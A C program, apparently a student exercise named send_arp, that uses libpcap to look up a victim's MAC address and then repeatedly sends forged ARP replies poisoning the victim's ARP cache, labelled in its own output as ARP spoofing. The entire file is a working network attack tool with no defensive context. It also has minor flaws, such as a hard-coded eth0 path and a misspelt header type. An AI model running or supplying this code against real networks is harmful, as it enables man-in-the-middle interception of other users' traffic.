#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>

#define HARDWARE_LEN 6
#define PROTOCOL_LEN 4
#define ETHER_TYPE_ARP 0x0806
#define HARDWARE_TYPE 0x0001
#define PROTOCOL_TYPE 0x0800
#define OPERATION_REQ 0x0001
#define OPERATION_REP 0x0002

struct sniff_ethernet{
	uint8_t ether_dhost[HARDWARE_LEN];
	uint8_t ether_shost[HARDWARE_LEN];
	uint16_t ether_type;
};

struct arp_packet{
	uint8_t destination_mac[HARDWARE_LEN];
	uint8_t source_mac[HARDWARE_LEN];
	uint16_t ether_type;
	uint16_t hardware_type;
	uint16_t protocol_type;
	uint8_t hardware_len;
	uint8_t protocol_len;
	uint16_t operation;
	uint8_t sender_hardware_addr[HARDWARE_LEN];
	uint8_t sender_ip_addresss[PROTOCOL_LEN];
	uint8_t target_hardware_addr[HARDWARE_LEN];
	uint8_t target_ip_addresss[PROTOCOL_LEN];
};

void usage() {
	printf("Please execute like this\n ./send_arp <interface> <sender_ip> <target_ip>");;
}

void * get_mac_address(uint8_t * my_MAC)
{
	unsigned int my_MAC_fetch[6];
	FILE *fp;
	fp = fopen("/sys/class/net/eth0/address","r");
	fscanf(fp, "%x:%x:%x:%x:%x:%x",&my_MAC_fetch[0],&my_MAC_fetch[1],&my_MAC_fetch[2],&my_MAC_fetch[3],&my_MAC_fetch[4],&my_MAC_fetch[5]);
	for(int i = 0; i<6 ; i++)
	{
		my_MAC[i] = (uint8_t)my_MAC_fetch[i];
	}
	fclose(fp);

}

struct arp_packet request_packet(struct arp_packet packet, uint8_t * my_MAC, char * argv[])
{
	for(int i=0; i<6; i++)
	{
		packet.source_mac[i] = my_MAC[i];
		packet.sender_hardware_addr[i] = my_MAC[i];
		packet.destination_mac[i] = '\xff';
		packet.target_hardware_addr[i] ='\x00';
	}
	packet.ether_type = htons(ETHER_TYPE_ARP);
	packet.hardware_type = htons(HARDWARE_TYPE);
	packet.protocol_type = htons(PROTOCOL_TYPE);
	packet.hardware_len = HARDWARE_LEN;
	packet.protocol_len = PROTOCOL_LEN;
	packet.operation = htons(OPERATION_REQ);

	uint32_t num = inet_addr(argv[2]);
	packet.sender_ip_addresss[0] = num;
	packet.sender_ip_addresss[1] = num >> 8;
	packet.sender_ip_addresss[2] = num >> 16;
	packet.sender_ip_addresss[3] = num >> 24;
		
	num = inet_addr(argv[3]);
	packet.target_ip_addresss[0] = num;
	packet.target_ip_addresss[1] = num >> 8;
	packet.target_ip_addresss[2] = num >> 16;
	packet.target_ip_addresss[3] = num >> 24;

	return packet;
}

int main(int argc, char* argv[])
{
	if (argc != 4)
	{
		usage();
		return -1;
	}

	uint8_t my_MAC[6];
	struct arp_packet packet;

	get_mac_address(my_MAC);
	
	packet = request_packet(packet, my_MAC, argv);

	uint8_t *p = (uint8_t *)&packet;
	struct pacp_pkthdr *header;
	
	char* dev = argv[1];
  	char errbuf[PCAP_ERRBUF_SIZE];
  	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

  	if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    return -1;
  	}
  	printf("send packet--------------------------------------\n");
    if(pcap_sendpacket(handle, p, 42) != 0)
			fprintf(stderr, "\nError sending the packet! : %s\n", pcap_geterr(handle));

  	while (true) {

	    struct pcap_pkthdr* header;
	    const u_char* packet2;
	    int res = pcap_next_ex(handle, &header, &packet2);

	    if (res == 0) continue;
	    if (res == -1 || res == -2) break;
	    
	    struct sniff_ethernet *ethernet;
		ethernet = (struct sniff_ethernet*)(packet2);

		printf("receive packet-----------------------------------\n");
		printf("Ethernet destination MAC address is ");

	   	for(int i=0;i<HARDWARE_LEN;i++)
	   	{
	   		printf("%x",ethernet->ether_dhost[i]);
	   		if(i!=HARDWARE_LEN-1)
	   			printf(":");
	   	}

	   	printf("\n");
	   	printf("Ethernet source MAC address is ");
	   	for(int i=0;i<HARDWARE_LEN;i++)
	   	{
	   		printf("%x",ethernet->ether_shost[i]);
	   		packet.destination_mac[i] = ethernet->ether_shost[i];
	   		if(i!=HARDWARE_LEN-1)
	   			printf(":");
	   	}
	   	printf("\n");

	   	printf("Target IP : %s\n", argv[2]);
	   	printf("Target MAC : ");
	   	for(int i=0;i<HARDWARE_LEN;i++)
	   	{
	   		printf("%x",packet.destination_mac[i]);
	   		if(i!=HARDWARE_LEN-1)
	   			printf(":");
	   	}
	   	printf("\n");

		break;
	}
	packet.operation = htons(OPERATION_REP);

	while(1)
	{
		int cnt;
		printf("Send ARP Spoofing Packet\n");
		if(pcap_sendpacket(handle, p, 42) != 0)
			fprintf(stderr, "\nError sending the packet! : %s\n", pcap_geterr(handle));

		printf("Send packet one more time? Enter 1 \n Enter :");
		scanf("%d", &cnt);
		if(cnt != 1)
			break;
	}

	return 0;
}